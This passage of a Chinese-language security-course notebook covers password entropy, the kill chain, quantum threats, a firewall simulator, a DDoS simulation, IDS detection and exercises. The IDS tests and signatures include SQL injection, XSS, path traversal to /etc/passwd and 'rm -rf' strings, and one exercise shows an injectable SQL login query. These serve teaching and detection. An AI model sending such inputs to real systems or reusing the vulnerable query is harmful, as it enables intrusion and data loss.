ax.annotate('Attacker\n(攻击者)', xy=(1.0, 5.0), xytext=(-0.5, 5.0),
            fontsize=10, ha='center', color='#e74c3c', fontweight='bold',
            arrowprops=dict(arrowstyle='->', color='#e74c3c', lw=2))

plt.tight_layout()
plt.show()

print("纵深防御的核心思想：多层防护，即使一层被突破，还有其他层保护核心数据。")

In [ ]:
# === 密码强度分析器 (Password Strength Analyzer) ===

def calculate_entropy(password):
    """
    计算密码的信息熵 (Entropy)
    
    信息熵 = L * log2(N)
    L = 密码长度
    N = 可能的字符集大小
    
    熵越高，密码越难被暴力破解
    """
    charset_size = 0
    has_lower = bool(re.search(r'[a-z]', password))
    has_upper = bool(re.search(r'[A-Z]', password))
    has_digit = bool(re.search(r'[0-9]', password))
    has_special = bool(re.search(r'[!@#$%^&*()_+\-=\[\]{};:,.<>?/~`]', password))
    
    if has_lower:
        charset_size += 26
    if has_upper:
        charset_size += 26
    if has_digit:
        charset_size += 10
    if has_special:
        charset_size += 32
    
    if charset_size == 0:
        return 0
    
    entropy = len(password) * math.log2(charset_size)
    return entropy

def estimate_crack_time(entropy):
    """
    估算暴力破解所需时间
    假设攻击者每秒可尝试 10亿 (10^9) 次
    """
    guesses_per_second = 1e9
    total_combinations = 2 ** entropy
    # 平均需要尝试一半的组合
    seconds = (total_combinations / 2) / guesses_per_second
    
    if seconds < 1:
        return "不到1秒"
    elif seconds < 60:
        return f"{seconds:.1f} 秒"
    elif seconds < 3600:
        return f"{seconds/60:.1f} 分钟"
    elif seconds < 86400:
        return f"{seconds/3600:.1f} 小时"
    elif seconds < 86400 * 365:
        return f"{seconds/86400:.1f} 天"
    elif seconds < 86400 * 365 * 1000:
        return f"{seconds/(86400*365):.1f} 年"
    elif seconds < 86400 * 365 * 1e6:
        return f"{seconds/(86400*365*1000):.1f} 千年"
    elif seconds < 86400 * 365 * 1e9:
        return f"{seconds/(86400*365*1e6):.1f} 百万年"
    else:
        return f"{seconds/(86400*365*1e9):.1f} 十亿年"

def analyze_password(password):
    """
    全面分析密码强度
    """
    print(f"\n{'='*50}")
    # 显示密码（部分隐藏）
    masked = password[0] + '*' * (len(password)-2) + password[-1] if len(password) > 2 else '**'
    print(f"  密码: {masked} （长度: {len(password)}）")
    print(f"{'='*50}")
    
    # 检查各项标准
    checks = {
        '长度 >= 8': len(password) >= 8,
        '包含小写字母': bool(re.search(r'[a-z]', password)),
        '包含大写字母': bool(re.search(r'[A-Z]', password)),
        '包含数字': bool(re.search(r'[0-9]', password)),
        '包含特殊字符': bool(re.search(r'[!@#$%^&*()_+\-=\[\]{};:,.<>?/~`]', password)),
        '长度 >= 12': len(password) >= 12,
        '无连续重复字符': not re.search(r'(.)\1{2,}', password),
    }
    
    score = sum(checks.values())
    
    print("\n  检查项目:")
    for check_name, passed in checks.items():
        status = "[PASS]" if passed else "[FAIL]"
        print(f"    {status} {check_name}")
    
    # 计算熵
    entropy = calculate_entropy(password)
    crack_time = estimate_crack_time(entropy)
    
    print(f"\n  信息熵 (Entropy): {entropy:.1f} bits")
    print(f"  暴力破解预估时间: {crack_time}")
    print(f"  (假设每秒尝试 10^9 次)")
    
    # 综合评级
    if entropy < 28:
        level = "极弱 (Very Weak)"
        color_desc = "红色"
    elif entropy < 36:
        level = "弱 (Weak)"
        color_desc = "橙色"
    elif entropy < 50:
        level = "中等 (Fair)"
        color_desc = "黄色"
    elif entropy < 65:
        level = "强 (Strong)"
        color_desc = "浅绿"
    else:
        level = "非常强 (Very Strong)"
        color_desc = "绿色"
    
    print(f"\n  综合评级: {level}")
    print(f"  通过检查项: {score}/{len(checks)}")
    
    return entropy

# 测试不同密码
print("========================================")
print("   密码强度分析器 (Password Analyzer)")
print("========================================")

test_passwords = [
    "123456",           # 极弱
    "password",         # 弱
    "Hello123",         # 中等
    "MyP@ss2024!",      # 强
    "X#9kL!mN2$pQr@7z",  # 非常强
]

entropies = []
for pwd in test_passwords:
    e = analyze_password(pwd)
    entropies.append(e)

In [ ]:
# === 密码熵值 vs 破解时间可视化 ===

fig, (ax1, ax2) = plt.subplots(1, 2, figsize=(16, 6))

# --- 左图：不同密码的熵值对比 ---
labels = ['123456', 'password', 'Hello123', 'MyP@ss2024!', 'X#9kL!mN2$pQr@7z']
short_labels = ['123456\n(纯数字)', 'password\n(纯小写)', 'Hello123\n(混合)', 'MyP@ss2024!\n(复杂)', 'X#9kL!...\n(极复杂)']
colors = ['#e74c3c', '#e67e22', '#f1c40f', '#2ecc71', '#27ae60']

bars = ax1.bar(short_labels, entropies, color=colors, edgecolor='white', linewidth=1.5)

for bar, ent in zip(bars, entropies):
    ax1.text(bar.get_x() + bar.get_width()/2., bar.get_height() + 1,
             f'{ent:.0f} bits', ha='center', va='bottom', fontweight='bold', fontsize=10)

# 安全线
ax1.axhline(y=50, color='#e74c3c', linestyle='--', alpha=0.7, label='建议最低熵值 (50 bits)')
ax1.set_ylabel('信息熵 (bits)', fontsize=12)
ax1.set_title('不同密码的信息熵对比', fontsize=14, fontweight='bold')
ax1.legend(fontsize=10)
ax1.grid(axis='y', alpha=0.3)
ax1.spines['top'].set_visible(False)
ax1.spines['right'].set_visible(False)

# --- 右图：密码长度 vs 破解时间 ---
lengths = list(range(4, 21))

# 不同字符集的熵值
digits_only = [l * math.log2(10) for l in lengths]      # 纯数字
lower_only = [l * math.log2(26) for l in lengths]       # 纯小写
mixed = [l * math.log2(62) for l in lengths]            # 大小写+数字
full = [l * math.log2(94) for l in lengths]             # 所有可打印字符

# 转换为破解时间（秒的对数）
def entropy_to_log_seconds(entropy):
    return max(0, entropy - 30)  # log2(10^9) ≈ 30, 减去每秒猜测次数

ax2.plot(lengths, [entropy_to_log_seconds(e) for e in digits_only],
         'o-', label='纯数字 (0-9)', color='#e74c3c', linewidth=2)
ax2.plot(lengths, [entropy_to_log_seconds(e) for e in lower_only],
         's-', label='纯小写 (a-z)', color='#e67e22', linewidth=2)
ax2.plot(lengths, [entropy_to_log_seconds(e) for e in mixed],
         '^-', label='混合 (a-z,A-Z,0-9)', color='#3498db', linewidth=2)
ax2.plot(lengths, [entropy_to_log_seconds(e) for e in full],
         'D-', label='全字符集 (含特殊字符)', color='#27ae60', linewidth=2)

# 时间参考线
time_refs = {
    '1秒': 0,
    '1小时': math.log2(3600),
    '1年': math.log2(365.25*86400),
    '100年': math.log2(100*365.25*86400),
}
for label, val in time_refs.items():
    ax2.axhline(y=val, color='gray', linestyle=':', alpha=0.5)
    ax2.text(20.3, val, label, fontsize=8, va='center', color='gray')

ax2.set_xlabel('密码长度 (字符数)', fontsize=12)
ax2.set_ylabel('破解时间 (log2 秒)', fontsize=12)
ax2.set_title('密码长度 vs 暴力破解时间', fontsize=14, fontweight='bold')
ax2.legend(fontsize=9, loc='upper left')
ax2.grid(alpha=0.3)
ax2.spines['top'].set_visible(False)
ax2.spines['right'].set_visible(False)

plt.tight_layout()
plt.show()

print("\n关键结论：")
print("1. 密码长度是影响安全性的最重要因素")
print("2. 使用混合字符集（大小写+数字+特殊字符）能显著增加破解难度")
print("3. 建议密码长度至少12个字符，包含所有类型的字符")

In [ ]:
# === 攻击时间线可视化 (Attack Timeline Visualization) ===

fig, ax = plt.subplots(figsize=(16, 8))

# 模拟一次网络攻击的完整时间线
events = [
    {'time': 0, 'event': '侦察阶段 (Reconnaissance)',
     'detail': '攻击者扫描目标网络\n收集IP、端口、服务信息', 'color': '#95a5a6'},
    {'time': 2, 'event': '武器化 (Weaponization)',
     'detail': '制作恶意payload\n选择漏洞利用工具', 'color': '#f39c12'},
    {'time': 4, 'event': '投递 (Delivery)',
     'detail': '发送钓鱼邮件\n或利用Web漏洞', 'color': '#e67e22'},
    {'time': 6, 'event': '利用 (Exploitation)',
     'detail': '用户点击恶意链接\n漏洞被成功利用', 'color': '#e74c3c'},
    {'time': 8, 'event': '安装 (Installation)',
     'detail': '安装后门程序\n建立持久化机制', 'color': '#c0392b'},
    {'time': 10, 'event': '命令与控制 (C&C)',
     'detail': '与C&C服务器建立连接\n接收攻击者指令', 'color': '#8e44ad'},
    {'time': 12, 'event': '目标达成 (Actions)',
     'detail': '数据窃取/加密勒索\n横向移动感染更多主机', 'color': '#2c3e50'},
]

# 画时间线
ax.plot([0, 14], [4, 4], color='#bdc3c7', linewidth=3, zorder=1)

for i, evt in enumerate(events):
    # 交替上下放置
    y_offset = 1.8 if i % 2 == 0 else -1.8
    
    # 时间点圆圈
    ax.plot(evt['time'], 4, 'o', markersize=15, color=evt['color'],
            markeredgecolor='white', markeredgewidth=2, zorder=3)
    
    # 连接线
    ax.plot([evt['time'], evt['time']], [4, 4 + y_offset * 0.6],
            color=evt['color'], linewidth=1.5, linestyle='--', zorder=2)
    
    # 事件框
    text_y = 4 + y_offset
    box = mpatches.FancyBboxPatch(
        (evt['time'] - 1.2, text_y - 0.6), 2.4, 1.2,
        boxstyle='round,pad=0.1', facecolor=evt['color'],
        alpha=0.15, edgecolor=evt['color'], linewidth=1.5
    )
    ax.add_patch(box)
    
    # 事件名称
    ax.text(evt['time'], text_y + 0.25, evt['event'],
            ha='center', va='center', fontsize=8, fontweight='bold',
            color=evt['color'])
    # 事件详情
    ax.text(evt['time'], text_y - 0.25, evt['detail'],
            ha='center', va='center', fontsize=7, color='#555555')

ax.set_xlim(-1.5, 15)
ax.set_ylim(0.5, 7.5)
ax.axis('off')
ax.set_title('网络攻击生命周期 (Cyber Kill Chain)', fontsize=16, fontweight='bold', pad=20)

# 防御提示
ax.text(7, 0.8, '* Cyber Kill Chain 由 Lockheed Martin 提出，理解攻击流程有助于在每个阶段设置防御措施',
        ha='center', fontsize=9, color='#7f8c8d', style='italic')

plt.tight_layout()
plt.show()

## 六、量子计算对加密的威胁 (Quantum Computing Threats)

### 6.1 为什么量子计算是威胁？

当前的加密技术（如 RSA、ECC）的安全性基于一个假设：
**某些数学问题（如大数分解、离散对数）对传统计算机来说极其困难，需要数十亿年才能解决。**

然而，**量子计算机 (Quantum Computer)** 使用量子比特 (Qubit) 和量子叠加态、量子纠缠等特性，
可以同时处理海量数据，使某些问题的计算速度实现**指数级提升**。

### 6.2 Shor 算法的威胁

**Shor 算法 (Shor's Algorithm)** 是一种量子算法，可以在**多项式时间**内完成大数分解。

| 加密算法 | 传统计算机破解时间 | 量子计算机破解时间 | 受威胁程度 |
|----------|-------------------|-------------------|------------|
| RSA-2048 | 约 10^15 年 | 数小时 | 极高 |
| ECC-256 | 约 10^15 年 | 数分钟 | 极高 |
| AES-128 | 约 10^18 年 | 约 10^9 年 (Grover) | 中等 |
| AES-256 | 约 10^38 年 | 约 10^19 年 (Grover) | 低 |

### 6.3 受影响的加密类型

- **非对称加密 (Asymmetric):** RSA、ECC、Diffie-Hellman **将被完全破解**
- **对称加密 (Symmetric):** AES 的有效密钥长度减半（AES-256 变为 AES-128 的安全等级）
- **哈希函数 (Hash):** 碰撞攻击难度降低，但仍可用

### 6.4 后量子密码学 (Post-Quantum Cryptography, PQC)

科学家们正在开发能抵抗量子计算攻击的新加密算法：

| 类型 | 代表算法 | 原理 |
|------|----------|------|
| 格密码 (Lattice-based) | CRYSTALS-Kyber, CRYSTALS-Dilithium | 基于格问题的困难性 |
| 哈希签名 (Hash-based) | SPHINCS+ | 基于哈希函数的安全性 |
| 编码密码 (Code-based) | Classic McEliece | 基于纠错码的困难性 |

NIST（美国国家标准与技术研究院）已于2024年发布了首批后量子加密标准。

### 6.5 考试要点

- 量子计算**目前尚未**达到破解现有加密的能力（需要数百万稳定量子比特）
- 但**未来5-20年**可能实现，需要提前准备
- **HARVEST NOW, DECRYPT LATER** 攻击：攻击者现在收集加密数据，等量子计算机成熟后再解密
- 对称加密通过增加密钥长度（如从128位增加到256位）可以有效抵抗量子攻击

In [ ]:
# === 高级防火墙规则检查器 (Advanced Firewall Rule Checker) ===

class StatefulFirewall:
    """
    状态检测防火墙模拟器
    除了检查规则，还维护连接状态表
    """
    
    def __init__(self):
        self.rules = []
        self.state_table = {}  # 连接状态表
        self.log = []          # 日志记录
        self.default_policy = "DENY"
    
    def add_rule(self, action, src_ip, dst_ip, dst_port, protocol, desc):
        self.rules.append({
            'action': action, 'src_ip': src_ip, 'dst_ip': dst_ip,
            'dst_port': dst_port, 'protocol': protocol, 'description': desc
        })
    
    def process_packet(self, src_ip, dst_ip, dst_port, protocol, flags=''):
        """
        处理数据包，支持TCP连接状态追踪
        """
        conn_key = f"{src_ip}:{dst_ip}:{dst_port}"
        
        # 检查是否是已建立连接的后续包
        if conn_key in self.state_table:
            state = self.state_table[conn_key]
            if state == 'ESTABLISHED':
                self.log.append(f"[ALLOW] {conn_key} - 已建立连接，直接放行")
                return 'ALLOW'
        
        # 新连接 - 检查规则
        for rule in self.rules:
            if self._match(rule, src_ip, dst_ip, dst_port, protocol):
                if rule['action'] == 'ALLOW':
                    # 如果是TCP SYN包，记录连接状态
                    if protocol == 'TCP' and 'SYN' in flags:
                        self.state_table[conn_key] = 'SYN_SENT'
                        self.log.append(f"[ALLOW] {conn_key} - 新连接 SYN（规则: {rule['description']}）")
                    elif protocol == 'TCP' and 'ACK' in flags:
                        self.state_table[conn_key] = 'ESTABLISHED'
                        self.log.append(f"[ALLOW] {conn_key} - 连接已建立 ACK")
                    else:
                        self.log.append(f"[ALLOW] {conn_key} - 规则匹配: {rule['description']}")
                    return 'ALLOW'
                else:
                    self.log.append(f"[DENY] {conn_key} - 规则匹配: {rule['description']}")
                    return 'DENY'
        
        self.log.append(f"[DENY] {conn_key} - 默认策略拒绝")
        return 'DENY'
    
    def _match(self, rule, src_ip, dst_ip, dst_port, protocol):
        if rule['src_ip'] != '*' and rule['src_ip'] != src_ip:
            return False
        if rule['dst_ip'] != '*' and rule['dst_ip'] != dst_ip:
            return False
        if rule['dst_port'] != '*' and str(rule['dst_port']) != str(dst_port):
            return False
        if rule['protocol'] != '*' and rule['protocol'] != protocol:
            return False
        return True
    
    def show_state_table(self):
        print("\n--- 连接状态表 (State Table) ---")
        if not self.state_table:
            print("  (空)")
        for conn, state in self.state_table.items():
            print(f"  {conn} => {state}")
    
    def show_log(self):
        print("\n--- 防火墙日志 ---")
        for entry in self.log:
            print(f"  {entry}")


# 创建状态检测防火墙
print("============================================")
print("  状态检测防火墙模拟器 (Stateful Firewall)")
print("============================================\n")

sfw = StatefulFirewall()

# 添加规则
sfw.add_rule('ALLOW', '*', '10.0.0.1', 443, 'TCP', '允许HTTPS访问Web服务器')
sfw.add_rule('ALLOW', '*', '10.0.0.1', 80, 'TCP', '允许HTTP访问Web服务器')
sfw.add_rule('DENY', '*', '*', 22, 'TCP', '拒绝外部SSH访问')
sfw.add_rule('ALLOW', '10.0.0.*', '*', 53, 'UDP', '允许内网DNS查询')

print("\n--- 模拟网络流量 ---")

# 模拟TCP三次握手
print("\n[场景1] 正常HTTPS连接建立（三次握手）:")
sfw.process_packet('203.0.113.5', '10.0.0.1', 443, 'TCP', 'SYN')
sfw.process_packet('203.0.113.5', '10.0.0.1', 443, 'TCP', 'ACK')
sfw.process_packet('203.0.113.5', '10.0.0.1', 443, 'TCP', '')  # 后续数据包

print("\n[场景2] 外部SSH连接尝试:")
sfw.process_packet('198.51.100.1', '10.0.0.1', 22, 'TCP', 'SYN')

print("\n[场景3] 内网DNS查询:")
sfw.process_packet('10.0.0.5', '8.8.8.8', 53, 'UDP', '')

print("\n[场景4] 未知端口访问:")
sfw.process_packet('172.16.0.1', '10.0.0.1', 3389, 'TCP', 'SYN')

# 显示状态表和日志
sfw.show_state_table()
sfw.show_log()

In [ ]:
# === DDoS 攻击模拟与可视化 ===

print("============================================")
print("   DDoS 攻击模拟 (教学演示)")
print("============================================\n")

class SimpleServer:
    """模拟一个简单的Web服务器"""
    
    def __init__(self, name, max_connections=100):
        self.name = name
        self.max_connections = max_connections
        self.current_connections = 0
        self.total_requests = 0
        self.dropped_requests = 0
        self.history = []  # 记录每个时间步的状态
    
    def receive_requests(self, num_requests):
        """接收请求"""
        self.total_requests += num_requests
        accepted = min(num_requests, self.max_connections - self.current_connections)
        dropped = num_requests - accepted
        self.current_connections += accepted
        self.dropped_requests += dropped
        
        load = self.current_connections / self.max_connections * 100
        self.history.append({
            'connections': self.current_connections,
            'load': load,
            'dropped': dropped,
            'incoming': num_requests
        })
        
        status = "正常" if load < 80 else ("高负载" if load < 100 else "过载!!")
        return load, status
    
    def process_and_release(self, num_processed):
        """处理并释放连接"""
        released = min(num_processed, self.current_connections)
        self.current_connections -= released

# 创建服务器
server = SimpleServer("Web-Server-01", max_connections=100)

# 模拟30个时间步
print("时间  | 请求数  | 连接数  | 负载  | 丢弃  | 状态")
print("-" * 60)

random.seed(42)
for t in range(30):
    if t < 10:
        # 正常流量期
        incoming = random.randint(5, 15)
    elif t < 15:
        # DDoS攻击开始 - 流量逐渐增加
        incoming = random.randint(20, 50) + (t - 10) * 10
    elif t < 25:
        # DDoS攻击高峰
        incoming = random.randint(80, 150)
    else:
        # 攻击被缓解
        incoming = random.randint(5, 20)
    
    # 服务器处理一些请求
    server.process_and_release(random.randint(8, 20))
    
    load, status = server.receive_requests(incoming)
    
    print(f"  t={t:2d}  |  {incoming:4d}    |  {server.current_connections:4d}   | {load:5.1f}% | {server.history[-1]['dropped']:4d}  | {status}")

print(f"\n--- 攻击统计 ---")
print(f"总请求数: {server.total_requests}")
print(f"丢弃请求数: {server.dropped_requests}")
print(f"丢弃率: {server.dropped_requests/server.total_requests*100:.1f}%")

In [ ]:
# === DDoS 攻击可视化 ===

fig, (ax1, ax2) = plt.subplots(2, 1, figsize=(14, 9), sharex=True)

times = list(range(len(server.history)))
loads = [h['load'] for h in server.history]
incoming = [h['incoming'] for h in server.history]
dropped = [h['dropped'] for h in server.history]

# 上图：服务器负载
ax1.fill_between(times, loads, alpha=0.3, color='#e74c3c')
ax1.plot(times, loads, 'o-', color='#e74c3c', linewidth=2, markersize=4, label='服务器负载')
ax1.axhline(y=80, color='#f39c12', linestyle='--', alpha=0.8, label='高负载警戒线 (80%)')
ax1.axhline(y=100, color='#e74c3c', linestyle='--', alpha=0.8, label='最大容量 (100%)')

# 标注攻击阶段
ax1.axvspan(0, 9.5, alpha=0.1, color='green', label='正常流量')
ax1.axvspan(9.5, 24.5, alpha=0.1, color='red', label='DDoS攻击')
ax1.axvspan(24.5, 30, alpha=0.1, color='blue', label='攻击缓解')

ax1.set_ylabel('服务器负载 (%)', fontsize=12)
ax1.set_title('DDoS攻击对服务器负载的影响', fontsize=14, fontweight='bold')
ax1.legend(fontsize=9, loc='upper left')
ax1.set_ylim(0, 120)
ax1.grid(alpha=0.3)

# 下图：请求数和丢弃数
ax2.bar(times, incoming, color='#3498db', alpha=0.7, label='收到的请求数')
ax2.bar(times, dropped, color='#e74c3c', alpha=0.7, label='丢弃的请求数')

ax2.set_xlabel('时间步 (Time Step)', fontsize=12)
ax2.set_ylabel('请求数', fontsize=12)
ax2.set_title('请求数量与丢弃数量', fontsize=14, fontweight='bold')
ax2.legend(fontsize=10)
ax2.grid(alpha=0.3)

plt.tight_layout()
plt.show()

print("可以清楚看到：")
print("1. t=0~9: 正常流量，服务器负载低")
print("2. t=10~14: DDoS攻击开始，负载急剧上升")
print("3. t=15~24: 攻击高峰，服务器过载，大量请求被丢弃")
print("4. t=25~29: 攻击被缓解，服务器恢复正常")

In [ ]:
# === IDS 签名检测 vs 异常检测模拟 ===

print("============================================")
print("   IDS 检测方法模拟演示")
print("============================================\n")

# 已知攻击签名数据库
ATTACK_SIGNATURES = {
    "SYN_FLOOD": "大量SYN包且无ACK响应",
    "SQL_INJECT": "包含 OR 1=1 或 DROP TABLE 等SQL关键字",
    "XSS_ATTACK": "包含 <script> 标签",
    "DIR_TRAVERSAL": "包含 ../ 路径穿越",
    "CMD_INJECT": "包含 ; rm -rf 或 | cat /etc/passwd",
}

def signature_based_ids(traffic_data):
    """基于签名的检测"""
    alerts = []
    for sig_name, sig_desc in ATTACK_SIGNATURES.items():
        # 简化的签名匹配
        if sig_name == "SQL_INJECT" and ("OR 1=1" in traffic_data.upper() or "DROP TABLE" in traffic_data.upper()):
            alerts.append(f"[ALERT] 签名匹配: {sig_name} - {sig_desc}")
        elif sig_name == "XSS_ATTACK" and "<script>" in traffic_data.lower():
            alerts.append(f"[ALERT] 签名匹配: {sig_name} - {sig_desc}")
        elif sig_name == "DIR_TRAVERSAL" and "../" in traffic_data:
            alerts.append(f"[ALERT] 签名匹配: {sig_name} - {sig_desc}")
        elif sig_name == "CMD_INJECT" and ("; rm" in traffic_data or "| cat" in traffic_data):
            alerts.append(f"[ALERT] 签名匹配: {sig_name} - {sig_desc}")
    return alerts

def anomaly_based_ids(request_rate, avg_rate=10, std_dev=3):
    """基于异常的检测 - 简单的统计异常检测"""
    # 如果请求率超过平均值+2倍标准差，则视为异常
    threshold = avg_rate + 2 * std_dev
    if request_rate > threshold:
        deviation = (request_rate - avg_rate) / std_dev
        return True, f"请求率 {request_rate}/s 偏离基线 {deviation:.1f} 个标准差（阈值: {threshold}/s）"
    return False, f"请求率 {request_rate}/s 在正常范围内（阈值: {threshold}/s）"

# 测试签名检测
print("=== 签名检测 (Signature-based) 测试 ===\n")

test_traffic = [
    "GET /index.html HTTP/1.1",                          # 正常请求
    "GET /search?q=admin' OR 1=1 -- HTTP/1.1",           # SQL注入
    "POST /comment body=<script>alert('xss')</script>",   # XSS
    "GET /files/../../../etc/passwd HTTP/1.1",            # 目录穿越
    "GET /api/data HTTP/1.1",                             # 正常请求
]

for traffic in test_traffic:
    print(f"请求: {traffic}")
    alerts = signature_based_ids(traffic)
    if alerts:
        for alert in alerts:
            print(f"  {alert}")
    else:
        print("  [OK] 未检测到已知攻击特征")
    print()

# 测试异常检测
print("\n=== 异常检测 (Anomaly-based) 测试 ===\n")
print("基线参数: 平均请求率 = 10/s, 标准差 = 3\n")

test_rates = [8, 12, 15, 25, 50, 100]
for rate in test_rates:
    is_anomaly, msg = anomaly_based_ids(rate)
    status = "[ANOMALY!]" if is_anomaly else "[NORMAL]  "
    print(f"  {status} {msg}")

In [ ]:
# === 综合安全防御评分图 ===

fig, axes = plt.subplots(1, 2, figsize=(16, 7))

# --- 左图：安全措施覆盖范围（雷达图思路用柱状图替代） ---
ax = axes[0]

measures = ['防火墙\nFirewall', '杀毒软件\nAntivirus', 'IDS/IPS', '加密\nEncryption',
            '备份\nBackup', '培训\nTraining', 'MFA\n多因素认证', '补丁管理\nPatching']

# 两个组织的安全评分
org_a = [9, 7, 8, 8, 6, 4, 3, 5]  # 技术强但培训弱
org_b = [6, 8, 5, 7, 9, 9, 8, 8]  # 管理强但IDS弱

x = np.arange(len(measures))
width = 0.35

bars_a = ax.bar(x - width/2, org_a, width, label='组织A (技术导向)', color='#3498db', alpha=0.8)
bars_b = ax.bar(x + width/2, org_b, width, label='组织B (管理导向)', color='#e67e22', alpha=0.8)

ax.set_xticks(x)
ax.set_xticklabels(measures, fontsize=8)
ax.set_ylabel('评分 (1-10)', fontsize=11)
ax.set_title('两个组织的安全措施对比', fontsize=13, fontweight='bold')
ax.legend(fontsize=10)
ax.set_ylim(0, 11)
ax.grid(axis='y', alpha=0.3)
ax.axhline(y=7, color='#e74c3c', linestyle='--', alpha=0.5, label='建议最低标准')
ax.spines['top'].set_visible(False)
ax.spines['right'].set_visible(False)

# --- 右图：2020-2025年网络攻击趋势（模拟数据） ---
ax2 = axes[1]

years = ['2020', '2021', '2022', '2023', '2024', '2025']
ransomware = [150, 280, 420, 510, 620, 700]
phishing = [200, 350, 450, 550, 600, 650]
ddos = [100, 180, 250, 300, 380, 420]
supply_chain = [30, 80, 150, 250, 380, 500]

ax2.plot(years, ransomware, 'o-', linewidth=2, markersize=6, label='勒索软件 (Ransomware)', color='#e74c3c')
ax2.plot(years, phishing, 's-', linewidth=2, markersize=6, label='钓鱼攻击 (Phishing)', color='#f39c12')
ax2.plot(years, ddos, '^-', linewidth=2, markersize=6, label='DDoS攻击', color='#3498db')
ax2.plot(years, supply_chain, 'D-', linewidth=2, markersize=6, label='供应链攻击 (Supply Chain)', color='#9b59b6')

ax2.set_xlabel('年份', fontsize=11)
ax2.set_ylabel('攻击事件数 (模拟数据)', fontsize=11)
ax2.set_title('网络攻击趋势 (2020-2025)', fontsize=13, fontweight='bold')
ax2.legend(fontsize=9)
ax2.grid(alpha=0.3)
ax2.spines['top'].set_visible(False)
ax2.spines['right'].set_visible(False)

plt.tight_layout()
plt.show()

print("左图说明：纵深防御要求每个维度都达到最低标准，不能有明显短板")
print("右图说明：所有类型的网络攻击都在逐年增加，网络安全形势日益严峻")

## 七、知识总结与考试要点

### 7.1 关键术语对照表

| 中文 | 英文 | 定义 |
|------|------|------|
| 包过滤 | Packet Filtering | 根据IP/端口/协议过滤数据包 |
| 状态检测 | Stateful Inspection | 追踪连接状态的防火墙 |
| 应用层网关 | Application-Level Gateway | 代理式防火墙，深度检查内容 |
| 入侵检测系统 | IDS | 检测并报警 |
| 入侵防御系统 | IPS | 检测并自动阻止 |
| 签名检测 | Signature-based Detection | 匹配已知攻击特征 |
| 异常检测 | Anomaly-based Detection | 检测偏离正常基线的行为 |
| 纵深防御 | Defense in Depth | 多层次安全防护策略 |
| 网络分段 | Network Segmentation | 将网络划分为隔离的子网 |
| 非军事区 | DMZ | 面向外部的服务器隔离区 |
| 信息熵 | Entropy | 衡量密码随机性/强度的指标 |
| 后量子密码学 | Post-Quantum Cryptography | 抵抗量子计算攻击的加密算法 |

---

### 7.2 考试常见题型

1. **比较题：** 比较三种防火墙的工作原理和优缺点
2. **解释题：** 解释某种攻击的工作原理和防御措施
3. **分析题：** 给定场景，分析适合使用哪种安全措施
4. **讨论题：** 讨论量子计算对网络安全的影响
5. **设计题：** 为组织设计网络安全策略（纵深防御）

In [ ]:
# === 恶意软件特征对比表（编程方式展示） ===

print("=" * 85)
print("   恶意软件 (Malware) 七种类型特征对比")
print("=" * 85)

malware_data = [
    {
        'type': 'Virus (病毒)',
        'needs_host': '是',
        'self_replicate': '是',
        'spread': '需用户运行感染文件',
        'main_damage': '破坏文件/系统',
        'stealth': '低-中',
    },
    {
        'type': 'Worm (蠕虫)',
        'needs_host': '否',
        'self_replicate': '是',
        'spread': '网络漏洞自动传播',
        'main_damage': '消耗带宽/资源',
        'stealth': '低',
    },
    {
        'type': 'Trojan (木马)',
        'needs_host': '否',
        'self_replicate': '否',
        'spread': '伪装成正常软件',
        'main_damage': '后门/数据窃取',
        'stealth': '中-高',
    },
    {
        'type': 'Ransomware (勒索)',
        'needs_host': '否',
        'self_replicate': '部分可以',
        'spread': '钓鱼邮件/漏洞',
        'main_damage': '加密文件勒索',
        'stealth': '低(故意暴露)',
    },
    {
        'type': 'Rootkit',
        'needs_host': '否',
        'self_replicate': '否',
        'spread': '其他恶意软件安装',
        'main_damage': '隐藏恶意活动',
        'stealth': '极高',
    },
    {
        'type': 'Spyware (间谍)',
        'needs_host': '否',
        'self_replicate': '否',
        'spread': '捆绑/恶意网站',
        'main_damage': '监控/窃取信息',
        'stealth': '高',
    },
    {
        'type': 'Adware (广告)',
        'needs_host': '否',
        'self_replicate': '否',
        'spread': '捆绑在免费软件',
        'main_damage': '强制显示广告',
        'stealth': '低',
    },
]

# 打印表头
print(f"{'类型':<22} {'需要宿主':<10} {'自我复制':<12} {'传播方式':<22} {'主要危害':<18} {'隐蔽性'}")
print("-" * 85)

for m in malware_data:
    print(f"{m['type']:<20} {m['needs_host']:<10} {m['self_replicate']:<10} {m['spread']:<20} {m['main_damage']:<16} {m['stealth']}")

print("\n" + "=" * 85)
print("\n考试关键区分点：")
print("1. Virus vs Worm: 病毒需要宿主程序，蠕虫独立运行且自动传播")
print("2. Trojan: 不会自我复制，靠欺骗用户主动安装")
print("3. Ransomware: 故意暴露自己的存在（要你交赎金）")
print("4. Rootkit: 隐蔽性最高，运行在系统最深层")
print("5. Spyware vs Adware: 间谍软件窃取信息，广告软件显示广告")

## 八、练习题 (Practice Exercises)

### 练习1：概念理解题

**Q1.** 解释包过滤防火墙 (Packet Filtering Firewall) 和状态检测防火墙 (Stateful Inspection Firewall) 的区别。(4分)

**Q2.** 描述签名检测 (Signature-based Detection) 和异常检测 (Anomaly-based Detection) 各自的优缺点。说明为什么实际中通常将两者结合使用。(6分)

**Q3.** 解释什么是 DDoS 攻击，它是如何工作的？列出两种防御 DDoS 的方法。(4分)

**Q4.** 区分病毒 (Virus) 和蠕虫 (Worm)。说明它们的传播方式有何不同。(4分)

**Q5.** 什么是纵深防御 (Defense in Depth)？列出并简要说明其五个防御层次。(5分)

---

### 练习2：场景分析题

**Q6.** 一家在线商店遭受了以下攻击：攻击者在商品评论区输入了 `<script>document.cookie</script>`。
- (a) 这是什么类型的攻击？(1分)
- (b) 解释这种攻击的工作原理。(3分)
- (c) 提出两种防御措施。(2分)

**Q7.** 一个Web应用使用以下SQL查询验证登录：
```
SELECT * FROM users WHERE username='" + input_user + "' AND password='" + input_pass + "'
```
- (a) 解释为什么这种方式不安全。(2分)
- (b) 攻击者可以输入什么来绕过登录？(2分)
- (c) 如何修复这个安全问题？(2分)

---

### 练习3：编程题

In [ ]:
# === 练习3a: 编写一个增强版的密码强度检查器 ===
#
# 要求：
# 1. 检查密码是否包含用户名（不安全）
# 2. 检查密码是否在常见密码列表中
# 3. 检查密码是否包含连续字符（如 abc, 123）
# 4. 计算熵值并给出评级
#
# 在下方编写你的代码：

# 常见弱密码列表
COMMON_PASSWORDS = [
    'password', '123456', '12345678', 'qwerty', 'abc123',
    'monkey', '1234567', 'letmein', 'trustno1', 'dragon',
    'baseball', 'iloveyou', 'master', 'sunshine', 'ashley',
    'football', 'shadow', 'password1', 'princess', '123456789'
]

def enhanced_password_check(password, username=''):
    """
    增强版密码强度检查器
    
    请完成以下功能：
